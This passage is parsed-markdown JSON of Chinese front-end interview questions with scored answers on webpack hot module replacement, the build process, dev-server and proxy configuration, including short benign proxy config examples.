值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。","text":" 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 由于 socket 服务器在 HMR Runtime 和 HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识\\n","task":false,"loose":false,"text":"**1：** 由于 socket 服务器在 HMR Runtime 和 HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识","tokens":[{"type":"text","raw":"**1：** 由于 socket 服务器在 HMR Runtime 和 HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识","text":"**1：** 由于 socket 服务器在 HMR Runtime 和 HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 由于 socket 服务器在 HMR Runtime 和 HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识","text":" 由于 socket 服务器在 HMR Runtime 和 HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n![alt text](/public/images/image.png)","task":false,"loose":false,"text":"**1：** 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n![alt text](/public/images/image.png)","tokens":[{"type":"text","raw":"**1：** 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n\\n![alt text](/public/images/image.png)","text":"**1：** 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n![alt text](/public/images/image.png)","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n","text":" 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n","escaped":false},{"type":"image","raw":"![alt text](/public/images/image.png)","href":"/public/images/image.png","title":null,"text":"alt text"}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 简述webpack的构建流程？\\n\\n","depth":2,"text":"简述webpack的构建流程？","tokens":[{"type":"text","raw":"简述webpack的构建流程？","text":"简述webpack的构建流程？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数\\n- **1：** 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理\\n- **1：** 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n![alt text](/public/images/image2.png)","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数\\n","task":false,"loose":false,"text":"**1：** 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数","tokens":[{"type":"text","raw":"**1：** 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数","text":"**1：** 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数","text":" 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理\\n","task":false,"loose":false,"text":"**1：** 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理","tokens":[{"type":"text","raw":"**1：** 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理","text":"**1：** 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理","text":" 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n![alt text](/public/images/image2.png)","task":false,"loose":false,"text":"**1：** 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n![alt text](/public/images/image2.png)","tokens":[{"type":"text","raw":"**1：** 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n\\n![alt text](/public/images/image2.png)","text":"**1：** 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n![alt text](/public/images/image2.png)","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n","text":" 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n","escaped":false},{"type":"image","raw":"![alt text](/public/images/image2.png)","href":"/public/images/image2.png","title":null,"text":"alt text"}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack proxy是什么？\\n\\n","depth":2,"text":"webpack proxy是什么？","tokens":[{"type":"text","raw":"webpack proxy是什么？","text":"webpack proxy是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)","task":false,"loose":false,"text":"**2：** webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)","tokens":[{"type":"text","raw":"**2：** webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)","text":"**2：** webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)","text":" webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack 中提供服务器的工具是什么？\\n\\n","depth":2,"text":"webpack 中提供服务器的工具是什么？","tokens":[{"type":"text","raw":"webpack 中提供服务器的工具是什么？","text":"webpack 中提供服务器的工具是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** webpack 中提供服务器的工具为 webpack-dev-server","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** webpack 中提供服务器的工具为 webpack-dev-server","task":false,"loose":false,"text":"**1：** webpack 中提供服务器的工具为 webpack-dev-server","tokens":[{"type":"text","raw":"**1：** webpack 中提供服务器的工具为 webpack-dev-server","text":"**1：** webpack 中提供服务器的工具为 webpack-dev-server","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" webpack 中提供服务器的工具为 webpack-dev-server","text":" webpack 中提供服务器的工具为 webpack-dev-server","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack-dev-server是什么？\\n\\n","depth":2,"text":"webpack-dev-server是什么？","tokens":[{"type":"text","raw":"webpack-dev-server是什么？","text":"webpack-dev-server是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。","task":false,"loose":false,"text":"**1：** webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。","tokens":[{"type":"text","raw":"**1：** webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。","text":"**1：** webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。","text":" webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack代理怎么配置？proxy中常用的属性是什么？\\n\\n","depth":2,"text":"webpack代理怎么配置？proxy中常用的属性是什么？","tokens":[{"type":"text","raw":"webpack代理怎么配置？proxy中常用的属性是什么？","text":"webpack代理怎么配置？proxy中常用的属性是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 配置如下：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 配置如下：","task":false,"loose":false,"text":"**1：** 配置如下：","tokens":[{"type":"text","raw":"**1：** 配置如下：","text":"**1：** 配置如下：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 配置如下：","text":" 配置如下：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\nconst path = require(\\"path\\");\\nmodule.exports = {\\n  // ...\\n  devServer: {\\n    contentBase: path.join(__dirname, \\"dist\\"),\\n    compress: true,\\n    port: 9000,\\n    proxy: {\\n      \\"/api\\": {\\n        target: \\"https://api.github.com\\",// \\n      },\\n    },\\n    // ...\\n  },\\n};\\n```","lang":"javascript","text":"const path = require(\\"path\\");\\nmodule.exports = {\\n  // ...\\n  devServer: {\\n    contentBase: path.join(__dirname, \\"dist\\"),\\n    compress: true,\\n    port: 9000,\\n    proxy: {\\n      \\"/api\\": {\\n        target: \\"https://api.github.com\\",// \\n      },\\n    },\\n    // ...\\n  },\\n};"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 常用属性：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 常用属性：","task":false,"loose":false,"text":"**2：** 常用属性：","tokens":[{"type":"text","raw":"**2：** 常用属性：","text":"**2：** 常用属性：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 常用属性：","text":" 常用属性：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >target：表示的是代理到的目标地址  \\n >pathRewrite：默认情况下，我们的 /api-hy 也会被写入到URL中，如果希望删除、可以使用pathRewrite  \\n >secure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false  \\n >changeOrigin：它表示是否更新代理后请求的 headers 中host地址  ","tokens":[{"type":"paragraph","raw":"target：表示的是代理到的目标地址  \\npathRewrite：默认情况下，我们的 /api-hy 也会被写入到URL中，如果希望删除、可以使用pathRewrite  \\nsecure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false  \\nchangeOrigin：它表示是否更新代理后请求的 headers 中host地址  ","text":"target：表示的是代理到的目标地址  \\npathRewrite：默认情况下，我们的 /api-hy 也会被写入到URL中，如果希望删除、可以使用pathRewrite  \\nsecure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false  \\nchangeOrigin：它表示是否更新代理后请求的 headers 中host地址  ","tokens":[{"type":"text","raw":"target：表示的是代理到的目标地址","text":"target：表示的是代理到的目标地址","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"pathRewrite：默认情况下，我们的 /api-hy 也会被写入到URL中，如果希望删除、可以使用pathRewrite","text":"pathRewrite：默认情况下，我们的 /api-hy 也会被写入到URL中，如果希望删除、可以使用pathRewrite","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"secure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false","text":"secure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"changeOrigin：它表示是否更新代理后请求的 headers 中host地址  ","text":"changeOrigin：它表示是否更新代理后请求的 headers 中host地址  ","escaped":false}]}],"text":"target：表示的是代理到的目标地址  \\npathRewrite：默认情况下，我们的 /api-hy 也会被写入到URL中，如果希望删除、可以使用pathRewrite  \\nsecure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false  \\nchangeOrigin：它表示是否更新代理后请求的 headers 中host地址  "},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## proxy是工作原理？\\n\\n","depth":2,"text":"proxy是工作原理？","tokens":[{"type":"text","raw":"proxy是工作原理？","text":"proxy是工作原理？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器","task":false,"loose":false,"text":"**1：** proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器","tokens":[{"type":"text","raw":"**1：** proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器","text":"**1：** proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器","text":" proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\nconst express = require(\'express\');\\nconst proxy = require(\'http-proxy-middleware\');\\nconst app = express();\\napp.use(\'/api\', proxy({target: \'http://www.example.org\', changeOrigin: true\\n}));\\napp.listen(3000);\\n```","lang":"javascript","text":"const express = require(\'express\');\\nconst proxy = require(\'http-proxy-middleware\');\\nconst app = express();\\napp.use(\'/api\', proxy({target: \'http://www.example.org\', changeOrigin: true\\n}));\\napp.listen(3000);"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack proxy 为什么能解决跨域？\\n\\n","depth":2,"text":"webpack proxy 为什么能解决跨域？","tokens":[{"type":"text","raw":"webpack proxy 为什么能解决跨域？","text":"webpack proxy 为什么能解决跨域？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** 在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。  \\n在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。  \\n**注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。  \\n在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。  \\n**注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。**","task":false,"loose":false,"text":"**2：** 在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。  \\n在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。  \\n**注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。**","tokens":[{"type":"text","raw":"**2：** 在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。  \\n\\n在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。  \\n\\n**注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。**","text":"**2：** 在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。  \\n在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。  \\n**注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。**","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 